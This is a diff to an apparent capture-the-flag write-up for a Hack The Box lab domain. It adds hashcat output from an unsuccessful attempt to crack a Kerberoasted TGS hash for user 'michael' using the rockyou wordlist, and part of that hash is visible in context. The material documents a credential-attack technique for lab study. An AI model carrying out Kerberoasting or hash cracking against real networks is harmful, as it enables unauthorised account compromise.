@@ -627,7 +627,24 @@ $krb5tgs$23$*michael$ADMINISTRATOR.HTB$administrator.htb/michael*$add1e69039bd27
 ```
 
 hashcat output for user michael:
-```bash
-
+```bash     
+Session..........: hashcat                                
+Status...........: Exhausted
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Hash.Target......: $krb5tgs$23$*michael$ADMINISTRATOR.HTB$administrato...30cdd1
+Time.Started.....: Sat Dec  7 22:30:01 2024 (3 secs)
+Time.Estimated...: Sat Dec  7 22:30:04 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (./rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  4285.8 kH/s (1.66ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
+Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
+Progress.........: 14344384/14344384 (100.00%)
+Rejected.........: 0/14344384 (0.00%)
+Restore.Point....: 14344384/14344384 (100.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: $HEX[2321676f7468] -> $HEX[042a0337c2a156616d6f732103]
+Hardware.Mon.#1..: Temp: 48c Util: 52%
 ```
 
